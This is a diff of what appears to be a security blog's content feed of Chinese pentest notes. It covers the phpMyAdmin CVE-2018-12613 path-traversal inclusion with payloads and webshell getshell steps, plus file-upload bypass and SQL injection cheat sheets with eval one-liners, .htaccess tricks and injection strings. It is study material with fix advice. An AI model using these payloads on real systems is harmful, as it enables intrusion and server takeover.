+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="variable">$goto_whitelist</span> = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&#x27;db_datadict.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;db_sql.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;db_events.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;db_export.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;db_importdocsql.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;db_multi_table_query.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;db_structure.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;db_import.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;db_operations.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;db_search.php&#x27;</span></span><br><span class="line">				.......</span><br><span class="line">				<span class="string">&#x27;transformation_overview.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;transformation_wrapper.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;user_password.php&#x27;</span>,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
 
+<p><strong>第二个判断</strong> 肯定是True，没什么问题跳过。</p>
+<p><strong>第三个判断：</strong></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (in_array(<span class="variable">$page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
 
+<p>判断$page变量值在 $whitelist 数组中是否存在</p>
+<p><strong>第三个判断：</strong></p>
+<p>严谨的 phpmyadmin的开发团队为了防止 target 值后面跟上了其他参数（出现逻辑上的错误）保证能正常包含文件，又做了一次检查，先进行了一次url解码，然后使用<code>mb_substr</code> 和 <code>mb_strpose</code> 。以 ? 分割，获取前面的字符串做为 $_page 变量值，判断其是否存在 $whitelist 数组中。</p>
+<p>但这里的判断导致其出现了问题：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_page</span> = urldecode(<span class="variable">$page</span>);</span><br><span class="line">        <span class="variable">$_page</span> = mb_substr(</span><br><span class="line">            <span class="variable">$_page</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            mb_strpos(<span class="variable">$_page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">if</span> (in_array(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
 
-<h3 id="文件类型校验-MIME验证"><a href="#文件类型校验-MIME验证" class="headerlink" title="文件类型校验(MIME验证)"></a>文件类型校验(MIME验证)</h3><p>只检测数据包 content-type 字段导致的漏洞。（一般是通过后端利用PHP的全局数组 <code>$_FIFS()</code> ，通过<code>_FIFS[&#39;myFile&#39;][&#39;type&#39;]</code> 的获取文件类型）</p>
-<p>攻击手法：抓包修改 content-type 字段</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">image&#x2F;jpeg ：jpg图片格式</span><br><span class="line">   image&#x2F;png  ：png图片格式</span><br><span class="line">   image&#x2F;gif  ：gif图片格式  </span><br><span class="line">   text&#x2F;plain ：纯文本格式   </span><br><span class="line">   text&#x2F;xml   ：  XML格式</span><br><span class="line">   text&#x2F;html  ： HTML格式</span><br><span class="line">   application&#x2F;octet-strea：php格式</span><br><span class="line">   multipart&#x2F;form-data ： 需要在表单中进行文件上传时，就需要使用该格式</span><br></pre></td></tr></table></figure>
+<p>先对$page 进行了 <strong>url解码</strong>，再利用<strong>？标志</strong> 分割出值进行判断。</p>
+<p>假设我们传入的payload：<code>target=db_sql.php%253f/../../../../etc/passwd</code>  </p>
+<p><code>%253f</code> 是 <code>?</code>  的二次URL编码。$page urldecode后就变成了<code>db_sql.php?/../../../../etc/passwd</code> </p>
+<p>因此index.php 的第四个判断 <code>Core::checkPageValidity($_REQUEST[&#39;target&#39;])</code> 也返回了Ture。</p>
+<p>总结以上的各种逻辑绕过，于是我们通过URL二次编码就直接绕过了它的检测返回 True 并成功的实现了任意文件包含。</p>
+<h3 id="0x04-漏洞Getshell"><a href="#0x04-漏洞Getshell" class="headerlink" title="0x04 漏洞Getshell"></a>0x04 漏洞Getshell</h3><p>目前有三种方式：</p>
+<p><strong>方法一、创建数据库和表，写shell</strong></p>
+<p>1、创建一个 <code>text</code> 数据库，表名为 <code>shell</code> ,将shell写入列名</p>
+<p><img src="https://www.kro1lsec.com:442/images/2021/05/24/CVE-2018-12613-img2.png"></p>
+<p>2、在控制台获取数据库的绝对路径 <code>SELECT @@datadir</code></p>
+<p>其 webshell 的网站相对路径： <code>path/text/shell.frm</code></p>
+<p><img src="https://www.kro1lsec.com:442/images/2021/05/24/CVE-2018-12613-img3.png"></p>
+<p>3、文件包含数据库文件 getshell</p>
+<p>payload： <code>?target=db_datadict.php%253f/../../../Extensions\MySQL5.7.26\data\test\shell.frm</code></p>
+<p><img src="https://www.kro1lsec.com:442/images/2021/05/24/CVE-2018-12613-img4.png"></p>
+<p>成功包含，可以直接写入一句话getshll。</p>
+<p><strong>方法二、开启general_log，日志Getshell</strong></p>
+<p>MySQL5.0版本以上会创建日志文件，通过修改日志的全局变量打开日志并指定日志保存路径，再通过查询写入一句话木马，此时该木马会被日志记录并生成日志文件，从而GetShell。但是前提是要对生成的日志文件有读写权限。</p>
+<p>查询日志信息： <code>show variables like &#39;%general%&#39;</code></p>
+<p>general_log：日志保存状态</p>
+<p>general_log_file：日志保存路径</p>
+<p>开启日志保存并配置保存路径</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set global general_log &#x3D; &quot;ON&quot;;    -- 打开日志保存</span><br><span class="line">set global general_log_file &#x3D; &quot;E:&#x2F;phpstudy&#x2F;WWW&#x2F;log.php&quot;;  -- 设置日志保存路径,需先得知网站物理路径,否则即使写入了Shell也无法通过URL连接</span><br></pre></td></tr></table></figure>
 
+<p>写webshell</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select &#39;&lt;?php eval($_POST[a]); ?&gt;&#39;;</span><br></pre></td></tr></table></figure>
 
-
-<h3 id="文件内容校验"><a href="#文件内容校验" class="headerlink" title="文件内容校验"></a>文件内容校验</h3><p>后端代码对上传文件的具体内容进行检测</p>
-<p><strong>检测一：文件头校验</strong></p>
-<ul>
-<li><p><strong>getimagesize() 函数</strong></p>
-</li>
-<li><p><strong>exif_imagetype() 函数</strong></p>
-<blockquote>
-<p>php内置函数，通过读取一个图像的第一个字节并检查其签名 检测其是否为图片类型文件</p>
-</blockquote>
-</li>
-</ul>
-<p>绕过手法：</p>
-<p>（1）添加标志头</p>
-<table>
-<thead>
-<tr>
-<th>类型</th>
-<th>二进制值</th>
-<th>字符串形式</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>JPG</td>
-<td>FF D8 FF E0 00 10 4A 46 49 46</td>
-<td>?</td>
-</tr>
-<tr>
-<td>GIF</td>
-<td>47 49 46 38 39 61</td>
-<td>GIF89a</td>
-</tr>
-<tr>
-<td>PNG</td>
-<td>89 50 4E 47</td>
-<td>塒NG</td>
-</tr>
-<tr>
-<td>TIF</td>
-<td>49 49 2A 00</td>
-<td>II*</td>
-</tr>
-<tr>
-<td>BMP</td>
-<td>42 4D</td>
-<td>BM</td>
-</tr>
-</tbody></table>
-<p>（2）制作图片马</p>
-<p>（3）修改配置文件（.htaccess、php.ini）</p>
-<p>（3）预定义高度宽度</p>
-<p>（4）利用<code>x00x00x8ax39x8ax39</code>文件头</p>
-<p>x00x00x8ax30x8ax39 是 wbmp 文件的文件头，但 0x00在 .htaccess 文件中为是注释符，不会影响文件本身。<strong>使用十六进制编辑器或者python的bytes字符类型(b’’)来进行添加。</strong></p>
-<p>payload</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">shell &#x3D; b&quot;\x00\x00\x8a\x39\x8a\x39&quot;+b&quot;00&quot; + &#39;文件内容&#39;</span><br></pre></td></tr></table></figure>
-
-
-
-<p><strong>检测二：内容关键字匹配 &lt;?php ?&gt;</strong></p>
-<p>绕过手法：短标签绕过、编码绕过、版本漏洞</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">适用于PHP5.x版本</span><br><span class="line">&lt;script language&#x3D;&quot;php&quot;&gt;eval($_POST[&#39;cmd&#39;]);&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">短标签</span><br><span class="line">&lt;?&#x3D;@eval($_POST[&#39;abd&#39;]);?&gt;</span><br></pre></td></tr></table></figure>
-
-
-
-<p><strong>检测三：二次渲染</strong></p>
-<p>对上传的图片进行二次修改，删除恶意代码</p>
-<p>绕过手法：</p>
-<p>一般采用上传gif的图片码 (gif较容易)</p>
-<p>寻找二次渲染后文件十六进制 不变的地方</p>
-<p>对gif加入木马代码再次上传</p>
-<h3 id="自定义规则"><a href="#自定义规则" class="headerlink" title="自定义规则"></a>自定义规则</h3><p>对上传的文件进行重命名，隐藏上传路径等等</p>
-<h4 id="通用手法"><a href="#通用手法" class="headerlink" title="通用手法"></a><strong>通用手法</strong></h4><p><strong>（1）图片马</strong></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">copy logo.jpg&#x2F;b+test.php&#x2F;a   test.jpg</span><br></pre></td></tr></table></figure>
-
-<p><strong>（2）配合解析漏洞</strong></p>
-<p><strong>（3）利用配置文件</strong></p>
-<p><strong>.htaccess</strong></p>
-<p>可以实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(1)</span><br><span class="line">&lt;FilesMatch &quot;1.gif&quot;&gt;            #将&quot;1.gif文件解析成php文件 可以通过修改1.gif来变化&quot;</span><br><span class="line">	SetHandler application&#x2F;x-httpd-php</span><br><span class="line">&lt;&#x2F;FilesMatch&gt;</span><br><span class="line"></span><br><span class="line">(2)</span><br><span class="line">AddType application&#x2F;x-http-php .jpg      #将所有jpg文件解析成php文件</span><br></pre></td></tr></table></figure>
-
-<p><strong>.user.ini</strong></p>
-<p>适用 Nginx/apache/IIS，当使用CGI／FastCGI来解析php时，php会优先搜索目录下所有的.ini文件，并应用其中的配置。类似于apache的.htaccess，但语法与.htacces不同，语法跟php.ini一致。</p>
-<p>.user.ini文件内容</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">auto_prepend_file&#x3D;test.jpg</span><br></pre></td></tr></table></figure>
-
-<p>所有的php文件都自动包含test.jpg文件。<code>.user.ini</code>相当于一个用户自定义的<code>php.ini</code>。</p>
-<h4 id="其他技巧"><a href="#其他技巧" class="headerlink" title="其他技巧"></a>其他技巧</h4><blockquote>
-<p>详见在标签文章</p>
-</blockquote>
-<ul>
-<li>竞争上传</li>
-</ul>
-<h2 id="其他绕过手法"><a href="#其他绕过手法" class="headerlink" title="其他绕过手法"></a>其他绕过手法</h2><ul>
-<li>配合文件包含漏洞</li>
-<li>解析漏洞</li>
-<li>OS系统特性</li>
-<li>CMS、编辑器漏洞</li>
-<li>配合其他规则</li>
-<li>WAF绕过</li>
-</ul>
-<h3 id="配合文件包含漏洞"><a href="#配合文件包含漏洞" class="headerlink" title="配合文件包含漏洞"></a>配合文件包含漏洞</h3><p>前提：校验规则只校验当文件后缀名为asp/php/jsp的文件内容是否为木马。</p>
-<p>绕过方式：（此漏洞主要存在PHP中）</p>
-<p>（1）上传内容为木马的txt、jpg图片</p>
-<p>（2）上传具有文件包含功能的php文件</p>
-<h3 id="CMS、编辑器漏洞"><a href="#CMS、编辑器漏洞" class="headerlink" title="CMS、编辑器漏洞"></a>CMS、编辑器漏洞</h3><p>（1）CMS漏洞：比如说JCMS等存在的漏洞，可以针对不同CMS存在的上传漏洞进行绕过。<br>（2）编辑器漏洞：比如FCK，ewebeditor等，可以针对编辑器的漏洞进行绕过。<br>这两方面的漏洞以后单独成文汇总，这里点到为止。</p>
-<h3 id="WAF绕过"><a href="#WAF绕过" class="headerlink" title="WAF绕过"></a>WAF绕过</h3><h2 id="开发人员防御原则"><a href="#开发人员防御原则" class="headerlink" title="开发人员防御原则"></a>开发人员防御原则</h2><hr>
-<p>上传成功+获取路径+解析成功=getshell</p>
-<ul>
-<li><p>隐藏上传文件路径</p>
-</li>
-<li><p>使用配置文件配置web容器不对上传目录下的文件做解析</p>
-</li>
-<li><p>文件后缀名白名单校验</p>
-</li>
-<li><p>上传文件进行重命名(随机)</p>
-</li>
-</ul>
-<p><strong>黑名单</strong></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[&#39;php&#39;,&#39;phtml&#39;,&#39;php5&#39;,&#39;php4&#39;,&#39;php3&#39;,&#39;php2&#39;,&#39;php1&#39;,&#39;html&#39;,&#39;htm&#39;,&#39;phtml&#39;,&#39;pHp&#39;,&#39;pHp5&#39;,&#39;pHp4&#39;,&#39;pHp3&#39;,&#39;pHp2&#39;,&#39;pHp1&#39;,&#39;Html&#39;,&#39;Htm&#39;,&#39;pHtml&#39;,&#39;jsp&#39;,&#39;jspa&#39;,&#39;jspx&#39;,&#39;jsw&#39;,&#39;jsv&#39;,&#39;jspf&#39;,&#39;jtml&#39;,&#39;jSp&#39;,&#39;jSpx&#39;,&#39;jSpa&#39;,&#39;jSw&#39;,&#39;jSv&#39;,&#39;jSpf&#39;,&#39;jHtml&#39;,&#39;asp&#39;,&#39;aspx&#39;,&#39;asa&#39;,&#39;asax&#39;,&#39;ascx&#39;,&#39;ashx&#39;,&#39;asmx&#39;,&#39;cer&#39;,&#39;aSp&#39;,&#39;aSpx&#39;,&#39;aSa&#39;,&#39;aSax&#39;,&#39;aScx&#39;,&#39;aShx&#39;,&#39;aSmx&#39;,&#39;cEr&#39;,&#39;sWf&#39;,&#39;swf&#39;,&#39;htaccess&#39;,&#39;ini&#39;,&#39;inc&#39;, &quot;pht&quot;, &quot;jsp&quot;, &quot;jspa&quot;, &quot;jspx&quot;,&quot;&lt;&quot;,&quot;&gt;&quot;,&quot;jsw&quot;, &quot;jsv&quot;, &quot;jspf&quot;,&quot;jtml&quot;, &quot;asp&quot;, &quot;aspx&quot;, &quot;asa&quot;, &quot;asax&quot;, &quot;ascx&quot;, &quot;ashx&quot;, &quot;asmx&quot;, &quot;cer&quot;,&quot;&#123;&quot;,&quot;&#125;&quot;, &quot;swf&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
-<li><a href="https://www.freebuf.com/articles/web/188464.html">构造优质上传漏洞Fuzz字典</a></li>
-</ul>
+<p><strong>方法三、写入session文件包含webshell（推荐）</strong></p>
+<p>在 SQL 控制台 中执行   <code>select &#39;要执行的代码&#39;</code></p>
+<p><img src="https://www.kro1lsec.com:442/images/2021/05/24/CVE-2018-12613-img5.png"></p>
+<p>其代码操作会存入服务器端的session文件（服务器为了标记用户，对每个访问用户标识了一个唯一session值，并以文件的形式记录用户信息存放在服务器中）。</p>
+<p>一般情况下，session文件存放位置：</p>
+<p><strong>Linux：</strong> /tmp 或 /var/lib/php/session</p>
+<p><strong>Windows：</strong> C:\WINDOWS\Temp</p>
+<p>文件名为   <code>&quot;sess_&quot; + &quot;session值&quot;</code>  ，session值可以通过浏览器的F12 查询 。</p>
+<p><img src="https://www.kro1lsec.com:442/images/2021/05/24/CVE-2018-12613-img6.png"></p>
+<p>但 sesion 文件路径具体情况还是得具体分析，比如集成环境搭建的路径就集成在了独立的环境中。</p>
+<p>例如：我的环境是 phpstudy，其存储路径为：Phpstudy的安装目录下。</p>
+<p><img src="https://www.kro1lsec.com:442/images/2021/05/24/CVE-2018-12613-img7.png"></p>
+<p><strong>PS：SESSION 文件保存的目录由 <code>php.ini</code> 配置文件 <code>session.save_path= xxx</code>  参数设置</strong></p>
+<p>于是通过payload：<code>?target=db_datadict.php%253f/../../../Extensions/tmp/tmp/sess_fgeda0ibfi693iscj1inrs2lvpjg71i7</code></p>
+<p><img src="https://www.kro1lsec.com:442/images/2021/05/24/CVE-2018-12613-img8.png"></p>
+<h3 id="0x05-修复建议"><a href="#0x05-修复建议" class="headerlink" title="0x05 修复建议"></a>0x05 修复建议</h3><p>如果在不影响正常业务的情况下，建议直接更新到最新版。</p>
+<p>该漏洞在发布不久后，官方就立马修复了，通过git changelog 可以查看官方如何修复漏洞的。查看补丁源码，<a href="https://github.com/phpmyadmin/phpmyadmin/commit/d1360f46cef76c5182116eb2b8fdbab1b20e687a">URL链接</a>：</p>
+<p><img src="https://www.kro1lsec.com:442/images/2021/05/24/CVE-2018-12613-img9.png" alt="https://www.kro1lsec.com:442/images/2021/05/24/CVE-2018-12613-img1.png%208.png"></p>
+<p><img src="https://www.kro1lsec.com:442/images/2021/05/24/CVE-2018-12613-img10.png" alt="https://www.kro1lsec.com:442/images/2021/05/24/CVE-2018-12613-img1.png%209.png"></p>
+<p>其修复方案似乎有点简单粗暴，直接加了个<code>$include= false</code>，跳过了第二次的 $_page检测，仅执行第一次判断 $_page的合法性，因此也无法进入urldecode 的步骤了。</p>
 ]]></content>
-      <categories>
-        <category>Red</category>
-        <category>常见web漏洞</category>
-      </categories>
       <tags>
-        <tag>web安全</tag>
-        <tag>文件上传</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>注入</title>
-    <url>/2021/04/30/Red/%E5%B8%B8%E8%A7%81web%E6%BC%8F%E6%B4%9E/%E6%B3%A8%E5%85%A5/</url>
-    <content><![CDATA[<h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><p>概述：web应用程序对用户<strong>输入数据控制不严格</strong>，导致用户输入数据被<strong>拼接到SQL语句</strong>中被数据库<strong>执行</strong>导致的安全问题。</p>
-<h2 id="注入分类"><a href="#注入分类" class="headerlink" title="注入分类"></a>注入分类</h2><p><strong>按注入方式分类</strong></p>
-<ul>
-<li><p>联合注入：需要内容显示位。</p>
-</li>
-<li><p>报错注入：返回error信息。双查询注入、函数报错 <strong>extractvalue()；updatexml()</strong></p>
-</li>
-<li><p>盲注</p>
-<ul>
-<li>布尔注入：返回页面不同。<strong>异或注入^、’ or ‘1’=’1、三元 if 语句</strong></li>
-<li>时间盲注：界面不更新任何内容，sleep()</li>
-</ul>
-</li>
-<li><p>堆叠注入：</p>
-</li>
-</ul>
-<p><strong>按查询类型分类</strong></p>
-<p>数字型注入、字符型注入、搜索型注入</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">搜索型：select * from 表名 where 字段 like &#39;%关键字%&#39;</span><br></pre></td></tr></table></figure>
-
-
-
-<p><strong>按提交方式注入分类</strong></p>
-<p>GET、POST、Cookie、head头</p>
-<p><strong>按sql语句类型分类</strong></p>
-<p>insert（增）、delete（删）、update（改）、select（查）</p>
-<hr>
-<h2 id="注入检测手法"><a href="#注入检测手法" class="headerlink" title="注入检测手法"></a>注入检测手法</h2><p><strong>注入前的准备工作</strong>（注入点-&gt;输入类型-&gt;回显方式-&gt;未被过滤内容 -&gt;构造闭合）</p>
-<p>（1）找到存在注入漏洞的注入点   【搜索栏/登录框/url地址栏/header头】</p>
-<p>（2）判断输入类型   【字符串/数字类型/搜索型】</p>
-<p>（3）判断其回显方式（找到正确的显示位，根据回显来决定应该选用哪种注入类型）</p>
-<p>（4）判断被过滤的内容  【单双引号/sql语句/<strong>‘</strong> <strong>^ # , ; and union 空格</strong>】</p>
-<p>（5）判断SQL闭合方式</p>
-<h3 id="注入检测"><a href="#注入检测" class="headerlink" title="注入检测"></a>注入检测</h3><p><strong>常见的注入点</strong></p>
-<ul>
-<li>GET/POST/PUT/DELETE参数</li>
-<li>X-Forwarded-For、header头</li>
-<li>文件名</li>
-</ul>
-<p><strong>获取信息</strong></p>
-<ul>
-<li>数据库类型<ul>
-<li><code>and exists (select * from msysobjects ) &gt; 0</code> access数据库</li>
-<li><code>and exists (select * from sysobjects ) &gt; 0</code> SQLServer数据库</li>
-</ul>
-</li>
-<li>版本、主机名、用户名、库名</li>
-<li>表和字段<ul>
-<li>确定字段数<ul>
-<li>Order By</li>
-<li>Select Into</li>
-</ul>
-</li>
-<li>表名、列名</li>
-</ul>
-</li>
-</ul>
-<p><strong>基本查询语句</strong></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">order by n   判断数据库列数</span><br><span class="line">select group_concat(schema_name) from information_schema.schemata  查询数据库</span><br><span class="line">select group_concat(table_name) from information_schema.tables     查询表</span><br><span class="line">select group_concat(column_name) from information_schema.columns   查询字段</span><br><span class="line">select 字段名 from 表名                                				通过表和字段获查询记录</span><br><span class="line">条件：</span><br><span class="line">where table_schema&#x3D;&#39;数据库名&#39;</span><br><span class="line">where table_name&#x3D;&#39;表名&#39;</span><br><span class="line"></span><br><span class="line">关键表：</span><br><span class="line">schema 数据库</span><br><span class="line">table 表</span><br><span class="line">colum 字段</span><br><span class="line">information_schema 提供元数据查询的数据库</span><br><span class="line"></span><br><span class="line">1&#39; and extractvalue(0x0a,concat(0x0a,(database())))#   查询数据库</span><br></pre></td></tr></table></figure>
-
-<p><strong>常用参数</strong></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">version()：MySQL版本</span><br><span class="line">user():数据库用户名</span><br><span class="line">database():数据库名</span><br><span class="line">@@datadir:数据库存储路径</span><br><span class="line">@@basedir：mysql安装路径</span><br><span class="line">@@version_compile_os:操作系统版本</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="详细注入类型"><a href="#详细注入类型" class="headerlink" title="详细注入类型"></a>详细注入类型</h3><h4 id="Fuzz"><a href="#Fuzz" class="headerlink" title="Fuzz"></a>Fuzz</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">or 1&#x3D;</span><br><span class="line">&#39; and &#39;1&#39;&#x3D;&#39;1</span><br><span class="line">+ - ^ * % &#x2F;</span><br><span class="line">&lt;&lt; &gt;&gt; || | &amp; &amp;&amp;</span><br></pre></td></tr></table></figure>
-
-
-
-<h4 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h4><p><strong>(1)extractvalue()</strong>    对 xml 文档进行查询的函数，类似于 html 用标签查找元素    查询最大length为32</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">语法：extractvalue(XML_document，XPath_string)</span><br><span class="line">参数1:目标xml文档 参数2:xml路径(XPath语法)   </span><br><span class="line"></span><br><span class="line">利用思路：写入错误的XPath语法时，会返回写入的非法格式内容，</span><br><span class="line"></span><br><span class="line">构造语句：</span><br><span class="line">username&#x3D;admin&#39; union select 1,extractvalue(1,concat(0x7e,(select 语句))) #</span><br><span class="line">0x7e为 ~符号的16进制 用16进制是防止单双引号被过滤问题</span><br><span class="line"></span><br><span class="line">例：and extractvalue(1, concat(0x7e,(select table_name from information_schema.tables limit 1,1)));</span><br><span class="line"></span><br><span class="line">ps：extractvalue()能查询字符串的最大长度为32，可以利用substr进行截取或者利用limit</span><br><span class="line">										 或者使用reverse() 逆序函数</span><br></pre></td></tr></table></figure>
-
-<p><strong>(2)UPDATEXML()</strong>    更新xml文档      查询最大length为32</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">语法：UPDATEXML(XML_document，XPath_string，new_value)</span><br><span class="line">参数1:目标xml文档 参数2:xml路径(XPath语法) 参数3：替换查找到的符合条件的数据</span><br><span class="line"></span><br><span class="line">利用思路：写入错误的XPath语法时，返回写入的非法格式内容</span><br><span class="line"></span><br><span class="line">构造语句：</span><br><span class="line">username&#x3D;admin&#39; union select 1,updatexml(1,concat(0x7e,(sql语句)),1) #</span><br><span class="line">例：</span><br><span class="line">and 1&#x3D;(updatexml(1,concat(0x3a,(select user())),1))</span><br><span class="line"></span><br><span class="line">ps：UPDATEXML()能查询字符串的最大长度为32，可以利用substr进行截取或者利用limit</span><br><span class="line">									  或者使用reverse() 逆序函数</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-
-
-
-<h4 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h4><p><strong>布尔盲注</strong></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(1)普通布尔盲注：利用ascii(),substr(),二分法查找</span><br><span class="line">	id&#x3D;1&#39; and length(database())&#x3D;8 #</span><br><span class="line">	id&#x3D;1&#39; ascii(substr(database(),1,1))&gt;65</span><br><span class="line"></span><br><span class="line">(2)三元if语句</span><br><span class="line">	id&#x3D;1&#39; or if((select 语句),结果1,结果2) #</span><br><span class="line"></span><br><span class="line">	如果查询条件成立执行结果1,不成立执行结果2</span><br><span class="line">	if((ascii(substr((select 语句,x,1))&gt;x),1,2)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p><strong>时间盲注</strong></p>
-<p>涉及：sleep() 、 if(条件, true, false)、mid(str,1,1) 截取、ord(ascii编码)、length</p>
-<p>基础payload：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">x&#x3D;1 and sleep(if((select databse()&#x3D;&#39;xiaodi&#39;),0,5))</span><br><span class="line"></span><br><span class="line">判断表名长度</span><br><span class="line">union select</span><br><span class="line">1,2,3,sleep(if(length(table_name)&#x3D;4,0,5)) from information_schema.tables where table_schema&#x3D;databse() limit 0,1</span><br><span class="line"></span><br><span class="line">判断表名</span><br><span class="line">union select</span><br><span class="line">1,2,3,sleep(if(mid(table_name,1,1)&#x3D;&#39;a&#39;,0,5)) from information_schema.tables where table_schema&#x3D;database() limit 0,1</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">id&#x3D;1&#39; or if((select 语句),sleep(2),0)#   如果查询条件成立执行sleep(2),不成立执行0</span><br></pre></td></tr></table></figure>
-
-
-
-<h4 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">预处理语句使用方式：</span><br><span class="line">SET @sql &#x3D; variable;  &#x2F;&#x2F;设置变量</span><br><span class="line">PREPARE yuchuli from &#39;[my sql sequece]&#39;;   &#x2F;&#x2F;预定义SQL语句</span><br><span class="line">EXECUTE yucrename table &#96;当前表名&#96; to &#96;改后表名&#96;;   &#x2F;&#x2F;修改表名  </span><br><span class="line">		alter table &#96;表名&#96; add(字段名 字段类型 NULL) &#x2F;&#x2F;在表中添加字段</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">模板:</span><br><span class="line">SET @sql &#x3D; 执行语句；	   &#x2F;&#x2F;要执行的sql语句</span><br><span class="line">PREPARE 名称 from @sql；    &#x2F;&#x2F;名称随便取开心就好</span><br><span class="line">EXECUTE 名称；</span><br></pre></td></tr></table></figure>
-
-
-
-<p>利用思路：select查询语句在php代码里已经固定，通过执行堆叠注入将数据库的内容修改掉，使前端执行后的代码是查询我们的目标数据</p>
-<h2 id="注入攻击方向"><a href="#注入攻击方向" class="headerlink" title="注入攻击方向"></a>注入攻击方向</h2><h3 id="读取数据库信息"><a href="#读取数据库信息" class="headerlink" title="读取数据库信息"></a>读取数据库信息</h3><p>version()：MySQL版本<br>user():数据库用户名<br>database():数据库名<br>@@datadir:数据库存储路径<br>@@basedir：mysql安装路径<br>@@version_compile_os:操作系统版本</p>
-<p>数据库名、表名、列名、字段名、记录</p>
-<hr>
-<h3 id="高权限文件操作（Getshell）"><a href="#高权限文件操作（Getshell）" class="headerlink" title="高权限文件操作（Getshell）"></a>高权限文件操作（Getshell）</h3><blockquote>
-<p>读取  写入</p>
-</blockquote>
-<p><font color='red'>mysql注入文件操作：文件操作权限（<strong>root用户</strong>）允许情况下，可以直接写入shell</font></p>
-<p><strong>前置要求：</strong></p>
-<ul>
-<li>路径参数必须为绝对路径</li>
-<li>写入的路径文件可解析，写入位置为 www 网站下</li>
-<li>root权限用户</li>
-</ul>
-<p>读取文件函数：load_file(‘filename’)</p>
-<p>写入文件函数： into out file  ‘filename’</p>
-<p>信息获取</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">获取数据库用户：user</span><br><span class="line">获取操作系统：@@version_compile_os  (在写入文件时会涉及不同系统的特性 例如windows大小写不敏感)</span><br><span class="line">获取路径：@@DATADIR</span><br></pre></td></tr></table></figure>
-
-<p><strong>网站获取路径方法：</strong></p>
-<ul>
-<li><p>报错显示</p>
-</li>
-<li><p>google hacker语法</p>
-<p>inurl: php  warning</p>
-</li>
-<li><p>读取搭建平台的配置文件</p>
-<p>IIS6.0配置路径</p>
-<p>Apache 配置路径</p>
-<p>phpstudy 配置路径</p>
-</li>
-<li><p>漏洞报错</p>
-<p>例如：cms爆路径</p>
-</li>
-<li><p>遗留文件</p>
-<p>说明文件 ；例如 inurl:phpinfo.php</p>
-</li>
-<li><p>字典猜解</p>
-</li>
-</ul>
-<h3 id="高权限跨库注入"><a href="#高权限跨库注入" class="headerlink" title="高权限跨库注入"></a>高权限跨库注入</h3><p>跨库注入条件：root权限</p>
-<p>概述：网站A无注入点，网站B存在mysql注入(root权限用户)，A与B的存在于同一个数据库中，利用网站B注入获取网站A信息</p>
-<p>流程：</p>
-<ul>
-<li>获取所有数据库名</li>
-<li>获取目标数据库名</li>
-<li>执行常规操作获取表名和字段名</li>
-<li>获取相关数据时记得在表名前加上指定的数据库名</li>
-</ul>
